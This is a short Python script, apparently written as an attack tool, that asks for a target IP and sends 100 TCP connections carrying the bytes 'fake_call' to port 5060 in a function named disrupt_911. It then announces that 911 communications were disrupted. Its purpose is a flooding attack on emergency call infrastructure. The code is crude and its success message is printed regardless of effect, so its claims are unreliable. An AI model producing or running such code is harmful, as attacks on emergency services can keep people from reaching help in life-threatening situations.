import socket
import sys

def disrupt_911(target):
    try:
        for i in range(100):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, 5060))
            s.send(b"fake_call")
            s.close()
        print(f"Disrupted 911 communications at {target}")
    except socket.error:
        print("Couldn't connect to server.")
        sys.exit()

def main():
    target = input("Enter target IP: ")
    disrupt_911(target)

if __name__ == "__main__":
    main()
